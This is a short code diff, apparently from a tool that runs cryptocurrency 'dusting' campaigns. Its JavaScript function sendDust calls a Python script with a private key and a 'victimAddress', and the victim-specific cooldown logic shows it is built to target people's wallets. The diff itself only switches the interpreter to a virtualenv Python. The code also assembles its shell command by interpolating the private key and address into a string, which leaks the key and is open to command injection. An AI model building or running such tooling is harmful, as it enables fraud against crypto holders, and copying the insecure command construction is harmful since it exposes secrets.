@@ -282,16 +282,18 @@ function getDynamicCooldown(victimAddress) {
   return cooldown;
 }
 
-// --- Send dust via duster.py ---
+// ─── Send dust via duster.py ───
 async function sendDust(privateKey, victimAddress, campaignId) {
   const dusterPath = path.resolve(__dirname, '../tools/duster.py');
+  // ✅ Use the virtual environment's Python interpreter
+  const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');
 
   const env = { ...process.env, CHAIN: chainName };
   if (campaignId) {
     env.CAMPAIGN_ID = campaignId;
   }
 
-  const cmd = `python3 ${dusterPath} ${privateKey} ${victimAddress}`;
+  const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;
 
   try {
     const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
